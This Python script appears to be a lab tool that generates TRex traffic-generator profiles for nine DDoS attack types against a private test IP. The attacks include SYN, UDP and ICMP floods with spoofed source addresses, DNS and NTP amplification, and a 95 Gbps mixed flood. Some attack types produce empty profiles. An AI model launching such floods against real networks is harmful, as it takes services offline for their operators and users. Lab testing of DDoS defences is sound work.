#!/usr/bin/env python3
"""
Attack Profile Generator for TRex
Generates YAML configurations for 9 different DDoS attack types
Optimized for c6525-100g (100 Gbps)
"""

import os
import yaml

# Target configuration
TARGET_IP = "10.10.1.2"  # Update with your victim IP
TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # Update with victim MAC or broadcast

# Base directory for attack profiles
OUTPUT_DIR = "/local/exp/attacks"

attacks = {
    'syn_flood': {
        'name': 'TCP SYN Flood',
        'description': 'High-rate TCP SYN flood attack',
        'type': 'tcp',
        'tcp_flags': 'S',
        'rate_gbps': 50,
        'duration': 60,
        'packet_size': 64,
        'src_ip_random': True,
        'src_port_random': True,
        'dst_port': 80
    },
    
    'udp_flood': {
        'name': 'UDP Flood',
        'description': 'Volumetric UDP flood attack',
        'type': 'udp',
        'rate_gbps': 80,
        'duration': 60,
        'packet_size': 512,
        'src_ip_random': True,
        'src_port_random': True,
        'dst_port': 53
    },
    
    'dns_amp': {
        'name': 'DNS Amplification',
        'description': 'DNS amplification attack using ANY queries',
        'type': 'udp',
        'rate_gbps': 40,
        'duration': 60,
        'src_port': 53,
        'dst_port': 53,
        'amplification_factor': 50,
        'query_type': 'ANY',
        'domain': 'example.com'
    },
    
    'ntp_amp': {
        'name': 'NTP Amplification',
        'description': 'NTP monlist amplification attack',
        'type': 'udp',
        'rate_gbps': 35,
        'duration': 60,
        'src_port': 123,
        'dst_port': 123,
        'command': 'monlist'
    },
    
    'http_flood': {
        'name': 'HTTP GET Flood',
        'description': 'Application-layer HTTP flood',
        'type': 'http',
        'method': 'GET',
        'rate_gbps': 10,
        'duration': 60,
        'connections': 100000,
        'requests_per_conn': 1000,
        'path': '/',
        'user_agent': 'Mozilla/5.0'
    },
    
    'icmp_flood': {
        'name': 'ICMP Flood',
        'description': 'High-rate ICMP echo flood',
        'type': 'icmp',
        'rate_gbps': 30,
        'duration': 60,
        'packet_size': 1400,
        'icmp_type': 8,  # Echo request
        'src_ip_random': True
    },
    
    'fragmentation': {
        'name': 'IP Fragmentation Attack',
        'description': 'Malicious IP fragmentation',
        'type': 'ip',
        'rate_gbps': 20,
        'duration': 60,
        'fragment_size': 8,
        'offset_overlap': True,
        'fragments_per_packet': 100
    },
    
    'ack_flood': {
        'name': 'TCP ACK Flood',
        'description': 'TCP ACK flood attack',
        'type': 'tcp',
        'tcp_flags': 'A',
        'rate_gbps': 45,
        'duration': 60,
        'packet_size': 64,
        'src_ip_random': True,
        'src_port_random': True,
        'dst_port': 80,
        'window_size': 0
    },
    
    'volumetric': {
        'name': 'Volumetric Mixed Attack',
        'description': 'Mixed protocol volumetric attack',
        'type': 'mixed',
        'rate_gbps': 95,
        'duration': 60,
        'protocols': ['tcp', 'udp', 'icmp'],
        'ratio': [40, 40, 20]  # TCP:UDP:ICMP ratio
    }
}

def generate_trex_yaml(attack_name, config):
    """Generate TRex YAML configuration for an attack"""
    
    # Common TRex profile structure
    profile = []
    
    if config['type'] == 'tcp':
        # TCP-based attacks
        stream = {
            'name': f"{attack_name}_stream",
            'mode': {
                'type': 'continuous',
                'pps': int(config['rate_gbps'] * 1e9 / 8 / config.get('packet_size', 64))
            },
            'packet': {
                'binary': 'cap2/tcp_synack.pcap' if 'S' in config.get('tcp_flags', '') else 'cap2/tcp.pcap',
                'meta': 'tcp_' + config.get('tcp_flags', 'A').lower()
            },
            'vm': [
                {
                    'type': 'flow_var',
                    'name': 'src_ip',
                    'size': 4,
                    'op': 'random',
                },
                {
                    'type': 'write_flow_var',
                    'name': 'src_ip',
                    'pkt_offset': 'IP.src'
                }
            ] if config.get('src_ip_random') else []
        }
        profile.append({'stream': stream})
        
    elif config['type'] == 'udp':
        # UDP-based attacks
        stream = {
            'name': f"{attack_name}_stream",
            'mode': {
                'type': 'continuous',
                'pps': int(config['rate_gbps'] * 1e9 / 8 / config.get('packet_size', 512))
            },
            'packet': {
                'binary': 'cap2/dns.pcap',
                'meta': 'udp_dns'
            },
            'vm': [
                {
                    'type': 'flow_var',
                    'name': 'src_ip',
                    'size': 4,
                    'op': 'random',
                }
            ] if config.get('src_ip_random', True) else []
        }
        profile.append({'stream': stream})
        
    elif config['type'] == 'icmp':
        # ICMP flood
        stream = {
            'name': f"{attack_name}_stream",
            'mode': {
                'type': 'continuous',
                'pps': int(config['rate_gbps'] * 1e9 / 8 / config.get('packet_size', 1400))
            },
            'packet': {
                'binary': 'cap2/icmp.pcap',
                'meta': 'icmp_echo'
            }
        }
        profile.append({'stream': stream})
    
    return profile

def save_attack_profile(name, config):
    """Save attack configuration as YAML"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    filepath = os.path.join(OUTPUT_DIR, f"{name}.yaml")
    
    # Generate TRex-compatible profile
    trex_config = generate_trex_yaml(name, config)
    
    # Add metadata
    full_config = {
        'attack_metadata': {
            'name': config['name'],
            'description': config['description'],
            'type': config['type'],
            'rate_gbps': config['rate_gbps'],
            'duration': config['duration']
        },
        'trex_profile': trex_config
    }
    
    with open(filepath, 'w') as f:
        yaml.dump(full_config, f, default_flow_style=False, sort_keys=False)
    
    print(f"✓ Generated: {filepath}")

def generate_all_profiles():
    """Generate all attack profiles"""
    print("=" * 60)
    print("Generating Attack Profiles for TRex")
    print("=" * 60)
    print()
    
    for attack_name, config in attacks.items():
        save_attack_profile(attack_name, config)
    
    # Also save a combined summary
    summary_file = os.path.join(OUTPUT_DIR, "attack_summary.yaml")
    with open(summary_file, 'w') as f:
        yaml.dump(attacks, f, default_flow_style=False)
    
    print()
    print(f"✓ Generated {len(attacks)} attack profiles")
    print(f"✓ Summary saved to: {summary_file}")
    print()
    print("Attack Types:")
    for name, config in attacks.items():
        print(f"  - {name:20s} : {config['rate_gbps']:3.0f} Gbps - {config['name']}")

if __name__ == '__main__':
    generate_all_profiles()
